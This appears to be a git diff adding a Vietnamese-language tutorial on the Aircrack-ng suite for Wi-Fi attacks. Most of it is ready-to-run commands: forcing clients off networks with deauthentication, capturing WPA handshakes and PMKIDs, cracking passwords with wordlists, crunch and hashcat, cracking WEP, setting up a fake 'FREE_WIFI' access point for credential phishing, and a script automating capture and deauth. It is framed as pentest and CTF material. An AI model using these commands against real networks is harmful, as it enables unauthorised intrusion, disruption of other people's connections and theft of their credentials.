@@ -1,0 +1,177 @@
+1. Aircrack-ng là gì?
+
+    Aircrack-ng là bộ công cụ mã nguồn mở nổi tiếng nhất cho pentest và audit bảo mật Wi-Fi (802.11).
+
+    Bao gồm nhiều tool nhỏ:
+
+        airodump-ng: scan, sniff, thu thập handshake, monitor AP/client
+
+        aireplay-ng: injection, deauth, replay, fake auth, tạo traffic
+
+        aircrack-ng: crack pass từ handshake (offline)
+
+        airmon-ng: enable monitor mode card Wi-Fi
+
+        packetforge-ng, airbase-ng: tạo packet giả, fake AP
+
+        airdecap-ng, airserv-ng...
+
+    Hỗ trợ WEP, WPA, WPA2, WPA3-Transition, PMKID, nhiều mode attack khác nhau.
+
+2. Cài đặt Aircrack-ng
+A. Trên Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install aircrack-ng
+
+B. Kiểm tra
+
+aircrack-ng --help
+
+(Bộ tool CLI, chạy trên Linux, macOS, Windows)
+3. Cấu hình card Wi-Fi – vào monitor mode
+
+    Check card:
+
+sudo airmon-ng
+
+Enable monitor mode:
+
+sudo airmon-ng start wlan1
+
+Card sẽ thành wlan1mon (hoặc mon0). Nếu lỗi, tắt NetworkManager:
+
+    sudo systemctl stop NetworkManager
+
+4. Scan Wi-Fi, thu thập handshake với airodump-ng
+A. Scan mạng xung quanh
+
+sudo airodump-ng wlan1mon
+
+    Hiện ra danh sách AP, client, channel, encryption, signal, vendor...
+
+B. Focus vào 1 AP, lưu handshake
+
+sudo airodump-ng -c <channel> --bssid <BSSID_AP> -w capture wlan1mon
+
+    -c: kênh của AP
+
+    --bssid: MAC của AP
+
+    -w: file lưu kết quả (sinh ra file .cap)
+
+Ví dụ:
+
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wifi6 wlan1mon
+
+5. Tạo traffic & ép bắt handshake với aireplay-ng
+A. Gửi deauth (ép client reconnect, tạo handshake)
+
+sudo aireplay-ng -0 10 -a <BSSID_AP> wlan1mon
+
+    -0: deauth, 10 lần
+
+    Khi client reconnect, handshake sẽ được lưu trong file .cap của airodump-ng
+
+B. Deauth 1 client cụ thể (giảm noise)
+
+sudo aireplay-ng -0 5 -a <BSSID_AP> -c <MAC_CLIENT> wlan1mon
+
+    Xác định MAC client trong bảng STATION của airodump-ng
+
+6. Crack pass WPA/WPA2 bằng aircrack-ng
+A. Crack offline với wordlist
+
+aircrack-ng -w wordlist.txt -b <BSSID_AP> capture-01.cap
+
+    -w: wordlist (rockyou.txt, custom, CEWL, crunch…)
+
+    -b: MAC AP
+
+    Kết quả: hiện pass nếu trong wordlist!
+
+B. Hỗ trợ PMKID attack (1 số AP mới, không cần client)
+
+    Dùng tool hcxdumptool lấy PMKID, convert sang hashcat (22000), crack bằng hashcat/aircrack-ng.
+
+7. Crack nâng cao – PMKID, batch script, hybrid
+
+    Bắt PMKID (không cần client)
+
+hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=15
+
+Convert sang hashcat format
+
+    hcxpcapngtool -o wifi.22000 pmkid.pcapng
+    hashcat -m 22000 wifi.22000 wordlist.txt
+
+8. Tấn công WEP (vẫn gặp trong lab/IoT/CTF)
+
+    Capture packet:
+
+sudo airodump-ng -c 3 --bssid <BSSID_AP> -w wep wlan1mon
+
+Tạo traffic:
+
+sudo aireplay-ng -3 -b <BSSID_AP> wlan1mon
+
+Crack key:
+
+    aircrack-ng wep-01.cap
+
+9. Fake AP, MITM, lab phishing với airbase-ng
+
+    Tạo fake open AP:
+
+    sudo airbase-ng -e "FREE_WIFI" -c 6 wlan1mon
+
+    Kết hợp DHCP/DNS spoof, captive portal (ghost-phisher, wifiphisher...) để bắt credential.
+
+10. Mẹo thực chiến và automation
+
+    Pipe trực tiếp wordlist từ crunch/cewl để crack (không cần tạo file lớn):
+
+crunch 8 8 0123456789 | aircrack-ng -w - -b <BSSID_AP> capture-01.cap
+
+Script hóa toàn bộ workflow:
+
+    airmon-ng start wlan1
+    airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wifi6 wlan1mon &
+    sleep 3
+    aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan1mon
+
+    Log toàn bộ quá trình, lọc output đẹp cho report.
+
+11. Fix lỗi phổ biến
+Lỗi	Fix
+Không bắt được handshake	Đảm bảo client có kết nối, deauth đủ, đúng channel/BSSID, thử đổi card Wi-Fi
+Không vào monitor mode	Dùng card khác, check driver, tắt NetworkManager
+Deauth không hiệu quả	Một số AP mới chống deauth, thử bắt PMKID
+Crack không ra pass	Wordlist quá yếu, cần custom wordlist sát mục tiêu (CEWL, CUPP, crunch), dùng hashcat brute
+File .cap lỗi	Dùng Wireshark lọc lại handshake, chỉ để lại frame EAPOL
+Card không support injection	Dùng card khác (Atheros, Alfa nổi tiếng nhất)
+12. So sánh Aircrack-ng với các tool khác
+Tool	Ưu điểm Aircrack-ng	Khác biệt
+Aircrack-ng	Nhẹ, CLI, truyền thống, đủ workflow sniff/crack	Không automation/GUI như wifite, airgeddon
+Wifite/airgeddon	Pentest Wi-Fi tự động, bắt handshake, phishing, fake AP	Không tùy biến sâu, script hóa ít hơn
+Kismet	Sniffer/wardriving mạnh, đa giao thức, alert	Không crack pass, không injection
+Bettercap	Sniff/mitm/inject, BLE/IoT, CLI/web	Không mạnh về crack handshake
+13. Tài liệu, link hữu ích
+
+    Aircrack-ng Official
+
+    Aircrack-ng Cheat Sheet
+
+    Hacktricks – WiFi attacks
+
+    PayloadAllTheThings – WiFi
+
+    Wi-Fi CTF Labs
+
+Tóm tắt nhanh
+
+    Aircrack-ng là bộ tool mạnh nhất, truyền thống nhất để pentest/audit/hack Wi-Fi: sniff, deauth, bắt handshake, fake AP, crack WEP/WPA/WPA2/PMKID...
+
+    Tối ưu khi dùng với wordlist custom, script hóa workflow, phối hợp Kismet, hashcat, hydra, ghost-phisher...
+
+    Luôn kiểm tra driver/card support, brute-force wordlist sát thực tế, cẩn thận khi thực hiện trên mạng thật.
